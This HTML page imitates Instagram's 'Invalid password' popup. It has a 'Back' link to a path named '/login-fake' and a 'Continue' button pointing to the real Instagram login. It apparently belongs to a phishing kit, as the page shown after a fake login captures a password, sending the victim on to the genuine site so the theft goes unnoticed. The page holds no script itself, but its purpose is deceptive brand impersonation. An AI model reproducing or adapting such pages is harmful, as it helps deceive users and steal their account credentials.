<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Invalid Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .popup {
            background: #fff;
            border: 1px solid #ccc;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            text-align: center;
        }

        .popup h2 {
            color: #ed4956;
        }

        .popup p {
            margin: 15px 0;
        }

        .popup a {
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            margin: 10px;
            display: inline-block;
            font-weight: bold;
        }

        .back-btn {
            background-color: #dbdbdb;
            color: #000;
        }

        .continue-btn {
            background-color: #3897f0;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="popup">
        <h2>Invalid password</h2>
        <p>Oops! Something went wrong. Please try again or continue to Instagram.</p>
        <a href="/login-fake" class="back-btn">Back</a>
        <a href="https://www.instagram.com/accounts/login/" class="continue-btn">Continue</a>
    </div>
</body>
</html>
